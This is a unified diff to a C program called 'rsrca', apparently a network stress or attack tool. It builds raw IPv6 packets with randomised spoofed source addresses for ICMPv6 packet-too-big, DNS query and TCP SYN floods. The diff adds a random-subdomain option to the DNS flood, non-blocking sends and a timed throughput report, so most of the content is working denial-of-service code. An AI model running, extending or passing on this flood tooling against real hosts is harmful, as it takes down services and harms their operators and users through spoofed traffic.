@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <assert.h>
+#include <signal.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -21,9 +22,14 @@
 #include <time.h>
 
 #include "rnd_cpp.h"
+#include "inetchksm.h"
+#include "dns-utils.h"
 
 #define ARGV0 "rsrca"
 #define CACHE_SIZE 8192
+
+#define IS_NB_ERR(expr) ((expr) == EAGAIN || (expr) == EWOULDBLOCK)
+
 
 static struct {
 	struct {
@@ -48,6 +54,9 @@ static struct {
 			size_t len;
 		} rname;
 	} dns;
+	struct {
+		volatile bool report_due;
+	} flags;
 } gctx;
 
 static struct {
@@ -63,9 +72,8 @@ static struct {
 	struct {
 		bool dryrun;
 		bool quiet;
-		union {
-			uint32_t help:1;
-		};
+		bool help;
+		bool wildcard;
 	} flags;
 	int v;
 	const char *mode;
@@ -73,9 +81,20 @@ static struct {
 		const char *rname;
 		uint16_t rtype;
 	} dns;
+	unsigned int report_interval;
 	uint16_t dst_port;
 	uint64_t count;
 } param;
+
+
+static void init_dns_txt_labels (const char *rname) {
+	gctx.dns.rname.len = dns_labelize(rname, gctx.dns.rname.m, sizeof(gctx.dns.rname.m));
+
+	if (gctx.dns.rname.len == 0) {
+		perror(rname);
+		abort();
+	}
+}
 
 static bool rnd_do_seed (void *ctx, const int fd) {
 	const size_t seed_size = rnd_cpp_seed_size(ctx);
@@ -136,6 +155,7 @@ static void rnd_main (void) {
 static void init_params (void) {
 	param.dns.rtype = 16; // TXT
 	param.count = UINT64_MAX;
+	param.report_interval = 1;
 }
 
 static void init_global (void) {
@@ -249,8 +269,8 @@ static void genrnd (size_t len, void *out) {
 
 static void print_help (FILE *f) {
 	fprintf(f,
-"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT]"
-"       [-c|--count COUNT] [-T|--rtype RTYPE] [-R|--rname RNAME]\n"
+"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT] [-I|--report INT]\n"
+"       [-c|--count COUNT] [-T|--rtype RTYPE] [-R|--rname RNAME] [-w|--wildcard]\n"
 "       <--mode|-m MODE> [--] SRC_NET DST_ADDR\n"\
 "MODE:        'ptb_flood_icmp6_echo' | 'dns_flood' | 'syn_flood'\n"
 "SRC_NET:     2001:db8:1:2::/64\n"
@@ -261,6 +281,8 @@ static void print_help (FILE *f) {
 "  -p, --dst-port PORT  override destination port\n"
 "  -R, --rname RNAME    QNAME to use in queries\n"
 "  -T, --rtype RTYPE    numeric QTYPE to use in queries (default: 16 (TXT))\n"
+"  -w, --wildcard       prepend random label\n"
+"  -I, --report INT     report interval in seconds (default: 1)\n"
 "  -d, --dryrun         run in dry mode (don't actually send anything)\n"
 "  -v, --verbose        increase verbosity\n"
 "  -q, --quiet          report errors only\n"
@@ -272,8 +294,26 @@ static void print_help (FILE *f) {
 static void lock_ouput (void) {}
 static void unlock_ouput (void) {}
 
+bool sendto_masked_error (const int e) {
+	switch (e) {
+#if EAGAIN == EWOULDBLOCK
+	case EAGAIN:
+#else
+	case EAGAIN:
+	case EWOULDBLOCK:
+#endif
+		return false;
+	}
+
+	return true;
+}
+
 static void report_sent (const void *addr, const int err) {
-	char str_addr[INET6_ADDRSTRLEN] = { 0, };
+	static char str_addr[INET6_ADDRSTRLEN];
+
+	if (sendto_masked_error(err)) {
+		return;
+	}
 
 	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));
 
@@ -288,63 +328,6 @@ static void report_sent (const void *addr, const int err) {
 		);
 	}
 	unlock_ouput();
-}
-
-static uint16_t calc_chksum6 (
-	const struct ip6_hdr *ih,
-	const uint8_t *nh,
-	size_t n_len,
-	const uint8_t *data,
-	size_t data_len)
-{
-	uint_fast32_t sum = 0;
-	const uint_fast32_t tcp_length = (uint32_t)(n_len + data_len);
-	const uint8_t *addr_src = (const uint8_t*)&ih->ip6_src;
-	const uint8_t *addr_dst = (const uint8_t*)&ih->ip6_dst;
-
-	sum += ((uint_fast16_t)addr_src[0] << 8) | addr_src[1];
-	sum += ((uint_fast16_t)addr_src[2] << 8) | addr_src[3];
-	sum += ((uint_fast16_t)addr_src[4] << 8) | addr_src[5];
-	sum += ((uint_fast16_t)addr_src[6] << 8) | addr_src[7];
-	sum += ((uint_fast16_t)addr_src[8] << 8) | addr_src[9];
-	sum += ((uint_fast16_t)addr_src[10] << 8) | addr_src[11];
-	sum += ((uint_fast16_t)addr_src[12] << 8) | addr_src[13];
-	sum += ((uint_fast16_t)addr_src[14] << 8) | addr_src[15];
-
-	sum += ((uint_fast16_t)addr_dst[0] << 8) | addr_dst[1];
-	sum += ((uint_fast16_t)addr_dst[2] << 8) | addr_dst[3];
-	sum += ((uint_fast16_t)addr_dst[4] << 8) | addr_dst[5];
-	sum += ((uint_fast16_t)addr_dst[6] << 8) | addr_dst[7];
-	sum += ((uint_fast16_t)addr_dst[8] << 8) | addr_dst[9];
-	sum += ((uint_fast16_t)addr_dst[10] << 8) | addr_dst[11];
-	sum += ((uint_fast16_t)addr_dst[12] << 8) | addr_dst[13];
-	sum += ((uint_fast16_t)addr_dst[14] << 8) | addr_dst[15];
-
-	sum += (uint16_t)((tcp_length & 0xFFFF0000) >> 16);
-	sum += (uint16_t)(tcp_length & 0xFFFF);
-	sum += ih->ip6_ctlun.ip6_un1.ip6_un1_nxt;
-
-	// tcp header
-	while (n_len > 1) {
-		sum += ((uint_fast32_t)nh[0] << 8) + nh[1];
-		nh += 2;
-		n_len -= 2;
-	}
-	if (n_len > 0) {
-		sum += nh[0];
-	}
-
-	// data
-	while (data_len > 1) {
-		sum += ((uint_fast32_t)data[0] << 8) + data[1];
-		data += 2;
-		data_len -= 2;
-	}
-	if (data_len > 0) {
-		sum += data[0];
-	}
-
-	return ~((sum & 0xFFFF) + (sum >> 16));
 }
 
 static void genrnd_src_addr (void *out) {
@@ -395,17 +378,18 @@ static void do_report_print (
 static void do_report (const uint64_t cur_it) {
 	struct timespec ts_now, ts_elapsed;
 
-	clock_gettime(CLOCK_MONOTONIC, &ts_now);
-	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);
-
-	if (ts_elapsed.tv_sec <= 0) {
+	if (!gctx.flags.report_due) {
 		return;
 	}
+
+	clock_gettime(CLOCK_MONOTONIC, &ts_now);
+	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);
 
 	do_report_print(cur_it - gctx.bm.last_it_cnt, &ts_elapsed);
 
 	gctx.bm.ts_last_report = ts_now;
 	gctx.bm.last_it_cnt = cur_it;
+	gctx.flags.report_due = false;
 }
 
 static void mount_attack_icmp6_ptb (void) {
@@ -442,7 +426,7 @@ static void mount_attack_icmp6_ptb (void) {
 		snd_buf.body.icmp6.icmp6_cksum = 0;
 		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
 			&snd_buf.body.ih6,
-			(const uint8_t*)&snd_buf.body.icmp6,
+			&snd_buf.body.icmp6,
 			sizeof(struct icmp6_hdr),
 			NULL,
 			0
@@ -451,7 +435,7 @@ static void mount_attack_icmp6_ptb (void) {
 		snd_buf.icmp6.icmp6_cksum = 0;
 		snd_buf.icmp6.icmp6_cksum = htons(calc_chksum6(
 			&snd_buf.ih6,
-			(const uint8_t*)&snd_buf.icmp6,
+			&snd_buf.icmp6,
 			sizeof(snd_buf) - sizeof(struct ip6_hdr),
 			NULL,
 			0
@@ -462,7 +446,7 @@ static void mount_attack_icmp6_ptb (void) {
 			gctx.fd.sck,
 			&snd_buf,
 			sizeof(snd_buf),
-			MSG_NOSIGNAL,
+			MSG_NOSIGNAL | MSG_DONTWAIT,
 			(const struct sockaddr*)&param.dst.sa,
 			sizeof(struct sockaddr_in6));
 
@@ -481,44 +465,19 @@ static int main_ptb_flood_icmp6_echo (void) {
 	return 0;
 }
 
-static void foreach_label (
-		const char *in_rname,
-		void *uc,
-		bool(*cb)(char *label, uint8_t len, void *uc))
-{
-	char rname[256];
-	char *p, *dot;
-	uint8_t len;
+static void get_rnd_qname (char *out) {
+	const uint64_t n = pull_rnd();
+	const int fr = snprintf(
+		out,
+		256,
+		"%"PRIu64"%s%s",
+		n,
+		param.dns.rname[0] == '.' ? "" : ".",
+		param.dns.rname);
 
-	p = rname;
-	strncpy(rname, in_rname, sizeof(rname) - 1);
+	(void)fr;
 
-	do {
-		dot = strchr(p, '.');
-
-		if (dot != NULL) {
-			*dot = 0;
-		}
-		len = (uint8_t)strlen(p);
-		if (len > 0) {
-			if (!cb(p, len, uc)) {
-				return;
-			}
-		}
-		p = dot + 1;
-	} while (dot != NULL);
-
-	cb(NULL, 0, uc);
-}
-
-static bool label_rname (char *label, uint8_t len, void *) {
-	assert(gctx.dns.rname.len + len < sizeof(gctx.dns.rname));
-
-	gctx.dns.rname.m[gctx.dns.rname.len] = len;
-	memcpy(gctx.dns.rname.m + 1 + gctx.dns.rname.len, label, len);
-	gctx.dns.rname.len += (size_t)len + 1;
-
-	return true;
+	assert(0 < fr && fr < 256);
 }
 
 static void mount_attack_dns_flood (void) {
@@ -528,58 +487,67 @@ static void mount_attack_dns_flood (void) {
 		uint8_t data[512];
 	} snd_buf = { 0, };
 	ssize_t fr;
-	const uint16_t data_len = (uint16_t)gctx.dns.rname.len + 27;
-
-	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
-	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
-	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
-	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
-	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
-		(uint16_t)sizeof(struct udphdr) +
-		data_len
-	);
-	snd_buf.udp.uh_dport = htons(param.dst_port);
-	snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);
-
-	// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
-	snd_buf.data[2] = 0x01;
-	snd_buf.data[3] = 0x00;
-	// QDCOUNT: 1
-	snd_buf.data[4] = 0x00;
-	snd_buf.data[5] = 0x01;
-	// ANCOUNT, NSCOUNT
-	snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
-	// ARCOUNT: 1
-	snd_buf.data[10] = 0x00;
-	snd_buf.data[11] = 0x01;
-	// QNAME
-	memcpy(snd_buf.data + 12, gctx.dns.rname.m, gctx.dns.rname.len);
-	// QTYPE
-	snd_buf.data[gctx.dns.rname.len + 12] = (uint8_t)((param.dns.rtype & 0xff00) >> 8);
-	snd_buf.data[gctx.dns.rname.len + 13] = (uint8_t)(param.dns.rtype & 0x00ff);
-	// QCLASS: IN
-	snd_buf.data[gctx.dns.rname.len + 14] = 0x00;
-	snd_buf.data[gctx.dns.rname.len + 15] = 0x01;
-
-	// NAME: ROOT
-	snd_buf.data[gctx.dns.rname.len + 16] = 0x00;
-	// OPT
-	snd_buf.data[gctx.dns.rname.len + 17] = 0x00;
-	snd_buf.data[gctx.dns.rname.len + 18] = 0x29;
-	// UDP payload size: 1298
-	snd_buf.data[gctx.dns.rname.len + 19] = 0x05;
-	snd_buf.data[gctx.dns.rname.len + 20] = 0x12;
-
-	snd_buf.data[gctx.dns.rname.len + 21] = 0x00;
-	snd_buf.data[gctx.dns.rname.len + 22] = 0x00;
-
-	snd_buf.data[gctx.dns.rname.len + 23] = 0x00;
-	snd_buf.data[gctx.dns.rname.len + 24] = 0x00;
-	// Data length: 0
-	snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
-	snd_buf.data[gctx.dns.rname.len + 26] = 0x00;
+	uint16_t data_len;
 
 	for (uint64_t it = 0; it < param.count; it += 1) {
+		if (param.flags.wildcard) {
+			static char m[256];
+
+			get_rnd_qname(m);
+			init_dns_txt_labels(m);
+		}
+
+		data_len = (uint16_t)gctx.dns.rname.len + 27; // QNAME
+
+		memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
+		snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
+		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
+		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
+		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
+			(uint16_t)sizeof(struct udphdr) +
+			data_len
+		);
+		snd_buf.udp.uh_dport = htons(param.dst_port);
+		snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);
+
+		// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
+		snd_buf.data[2] = 0x01;
+		snd_buf.data[3] = 0x00;
+		// QDCOUNT: 1
+		snd_buf.data[4] = 0x00;
+		snd_buf.data[5] = 0x01;
+		// ANCOUNT, NSCOUNT
+		snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
+		// ARCOUNT: 1
+		snd_buf.data[10] = 0x00;
+		snd_buf.data[11] = 0x01;
+
+		memcpy(snd_buf.data + 12, gctx.dns.rname.m, gctx.dns.rname.len);
+		// QTYPE
+		snd_buf.data[gctx.dns.rname.len + 12] = (uint8_t)((param.dns.rtype & 0xff00) >> 8);
+		snd_buf.data[gctx.dns.rname.len + 13] = (uint8_t)(param.dns.rtype & 0x00ff);
+		// QCLASS: IN
+		snd_buf.data[gctx.dns.rname.len + 14] = 0x00;
+		snd_buf.data[gctx.dns.rname.len + 15] = 0x01;
+
+		// NAME: ROOT
+		snd_buf.data[gctx.dns.rname.len + 16] = 0x00;
+		// OPT
+		snd_buf.data[gctx.dns.rname.len + 17] = 0x00;
+		snd_buf.data[gctx.dns.rname.len + 18] = 0x29;
+		// UDP payload size: 1298
+		snd_buf.data[gctx.dns.rname.len + 19] = 0x05;
+		snd_buf.data[gctx.dns.rname.len + 20] = 0x12;
+
+		snd_buf.data[gctx.dns.rname.len + 21] = 0x00;
+		snd_buf.data[gctx.dns.rname.len + 22] = 0x00;
+
+		snd_buf.data[gctx.dns.rname.len + 23] = 0x00;
+		snd_buf.data[gctx.dns.rname.len + 24] = 0x00;
+		// Data length: 0
+		snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
+		snd_buf.data[gctx.dns.rname.len + 26] = 0x00;
+
 		genrnd_src_addr(&snd_buf.ih6.ip6_src);
 
 		// ID
@@ -589,9 +557,9 @@ static void mount_attack_dns_flood (void) {
 		genrnd(2, &snd_buf.udp.uh_sport);
 		snd_buf.udp.uh_sport = htons((snd_buf.udp.uh_sport % 59975) + 1025);
 		snd_buf.udp.uh_sum = 0;
-		snd_buf.udp.uh_sum = htons(calc_chksum6(
+		snd_buf.udp.uh_sum = htons(calc_chksum6_udp(
 			&snd_buf.ih6,
-			(const uint8_t*)&snd_buf.udp,
+			&snd_buf.udp,
 			sizeof(snd_buf.udp),
 			snd_buf.data,
 			data_len
@@ -602,11 +570,11 @@ static void mount_attack_dns_flood (void) {
 			gctx.fd.sck,
 			&snd_buf,
 			sizeof(struct ip6_hdr) + sizeof(struct udphdr) + data_len,
-			MSG_NOSIGNAL,
+			MSG_NOSIGNAL | MSG_DONTWAIT,
 			(const struct sockaddr*)&param.dst.sa,
 			sizeof(struct sockaddr_in6));
 
-		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
+		if (!IS_NB_ERR(errno) && (fr < 0 || (!param.flags.quiet && param.v > 0))) {
 			report_sent(&snd_buf.ih6.ip6_src, errno);
 		}
 		if (!param.flags.quiet) {
@@ -615,15 +583,8 @@ static void mount_attack_dns_flood (void) {
 	}
 }
 
-static void init_dns_txt_labels (void) {
-	gctx.dns.rname.len = 0;
-	foreach_label(param.dns.rname, NULL, label_rname);
-	assert(gctx.dns.rname.len < sizeof(gctx.dns.rname.m));
-}
-
 static int main_dns_flood (void) {
-	// TODO: parallelise?
-	init_dns_txt_labels();
+	init_dns_txt_labels(param.dns.rname);
 
 	mount_attack_dns_flood();
 
@@ -658,7 +619,7 @@ static void mount_attack_syn_flood (void) {
 		snd_buf.tcp.th_sum = 0;
 		snd_buf.tcp.th_sum = htons(calc_chksum6(
 			&snd_buf.ih6,
-			(const uint8_t*)&snd_buf.tcp,
+			&snd_buf.tcp,
 			sizeof(snd_buf.tcp),
 			NULL,
 			0
@@ -669,7 +630,7 @@ static void mount_attack_syn_flood (void) {
 			gctx.fd.sck,
 			&snd_buf,
 			sizeof(struct ip6_hdr) + sizeof(struct tcphdr),
-			MSG_NOSIGNAL,
+			MSG_NOSIGNAL | MSG_DONTWAIT,
 			(const struct sockaddr*)&param.dst.sa,
 			sizeof(struct sockaddr_in6));
 
@@ -756,13 +717,15 @@ static bool parse_param (const int argc, const char **argv) {
 		{ "rtype",    true,  NULL, 'T' },
 		{ "dst-port", true,  NULL, 'p' },
 		{ "count",    true,  NULL, 'c' },
+		{ "wildcard", false, NULL, 'w' },
+		{ "report",   true,  NULL, 'I' },
 	};
 	int loi = -1;
 	int fr;
 	bool fallthrough = false;
 
 	while (true) {
-		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:c:", LOPTS, &loi);
+		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:c:wI:", LOPTS, &loi);
 		if (fr < 0) {
 			break;
 		}
@@ -800,6 +763,12 @@ static bool parse_param (const int argc, const char **argv) {
 				return false;
 			}
 			break;
+		case 'w':
+			param.flags.wildcard = true;
+			break;
+		case 'I':
+			sscanf(optarg, "%u", &param.report_interval);
+			break;
 		default: return false;
 		}
 	}
@@ -816,6 +785,25 @@ static bool parse_param (const int argc, const char **argv) {
 	if (optind + 1 >= argc) {
 		fprintf(stderr, ARGV0": too few arguments\n");
 		return false;
+	}
+
+	if (param.flags.wildcard) {
+		const size_t l = strlen(param.dns.rname);
+		bool c;
+
+		if (param.dns.rname[0] == '.') {
+			c = l + 20 <= 255;
+		}
+		else {
+			c = l + 21 <= 255;
+		}
+
+		if (!c) {
+			fprintf(stderr, ARGV0": %s: ", param.dns.rname);
+			errno = ENAMETOOLONG;
+			perror(NULL);
+			return false;
+		}
 	}
 
 	fr = parse_net_str(
@@ -873,6 +861,25 @@ static bool resolve_dst (void) {
 	return true;
 }
 
+static void handle_report_signal (int) {
+	gctx.flags.report_due = true;
+	if (param.report_interval > 0) {
+		alarm(param.report_interval);
+	}
+}
+
+static void install_signal (void) {
+	struct sigaction sa = { 0, };
+
+	sa.sa_handler = handle_report_signal;
+	sa.sa_flags = SA_RESTART;
+	sigaction(SIGALRM, &sa, NULL);
+
+	if (param.report_interval > 0) {
+		alarm(param.report_interval);
+	}
+}
+
 int main (const int argc, const char **argv) {
 	int ec = 0;
 
@@ -903,6 +910,8 @@ int main (const int argc, const char **argv) {
 	if (!param.flags.quiet) {
 		fprintf(stderr, ARGV0": selected target: %s\n", gctx.dst.str_addr);
 	}
+
+	install_signal();
 
 	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
 		ec = main_ptb_flood_icmp6_echo();
